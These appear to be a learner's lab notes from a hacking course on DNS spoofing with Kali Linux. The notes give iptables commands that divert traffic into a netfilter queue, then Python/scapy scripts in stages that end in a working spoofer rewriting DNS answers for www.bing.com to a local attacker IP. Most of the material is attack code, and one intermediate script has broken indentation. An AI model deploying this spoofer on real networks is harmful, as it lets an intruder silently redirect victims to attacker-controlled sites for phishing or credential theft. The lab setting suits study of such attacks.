Same as INTERCEPTOR 
THIs will disable the internet. We need to let Kali work as a router an enabel the packets to flow through to the internet
enable ip forwarding echo 1 > /proc/sys/net/ipv4/ip_forward

--Testing on OWN PC--
iptables -I OUTPUT -j NFQUEUE --queue-num 0
-OUTPUT chain for packet leaving my computer....for testing on own machine 
iptables -I INPUT -j NFQUEUE --queue-num 0
--INPUT packets coming to my computer for testing on own computer directing packets to the queue

iptables -- flush  ( to delete ip tables that were created.whats in the tables)
after flush have to recreate tables again - above commands

--To enable webservice on own machine --
service apache2 start

print(packet.get_payload()) 
--will show contents of actual packets


scapy_packet = scapy.IP(packet.get_payload())
--converting packet get payload with scapy IP layer - Scapy will auto conver the packet into scapy packet and we can use the scapy functions

print(scapy_packet.show())
-- printing packets with all layers using scapy so we can see details for all layer and which layer had what data
---using scapy we can then modify the layer based on the field names

service apache2 start
kali can act as webserver and this will start it
--it will allow to access website thats instlled on this webserver usint IP of current computer (Kalimachine)
---if config-- to see ip, "inet" (inet 10.0.2.15) 
----copying this Ip to we web browser will show you the website

Install dns server on your Kali machine and then configure it to return particular address
OR craft a dns response from the Kali machine- 
OR forward the request to the right server-wait for response and then modify the IP part of the reposnse send the IP that we want.



if scapy.packet.haslayer(scapy.DNSRR)  -lookig forn layer with NDS response
-DNSRQ would be looking for request


ping -c 1 www.bing.com 
--creating one  dns request 

in case of ping issues:
iptables --flush
iptables --table nat --flush 
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward

Accessign scapy fields:
print(scapy_packet.show())
-first show the packets to know filed names or layers
--based on that we find the field names and can turn them to a variable

 scapy_packet[scapy.DNSQR].qname
 --accessing the qname field (name of website that user is requesting for DNS)
qname = scapy_packet[scapy.DNSQR].qname

------------------------------------------------------------------

#!/usr/bin/env python
import netfilterqueue


def process_packet(packet):
    print(packet.get_payload())
    packet.accept()
    

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

--------------------------------------------------------------
#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    print(scapy_packet.show())
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

#print(scapy_packet.show())---- printing packets with all layers using scapy so we can see details for all layer and which layer had what data

--------------------------------------------------------------------------------------------------------

#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
        print(scapy_packet.show())
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

-------------------------------------------------------------------------------------------------------------------

#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
rrname - is the website user requested
rdata- ip of the requested domain
Scapy will auto fill all data and we can just use the ones we want to change. 
------------------------------------------------------------------------------------------------

WORKING ON OWN PC: 

#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

-----------------------------------------------------------------------------------------------------


#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()



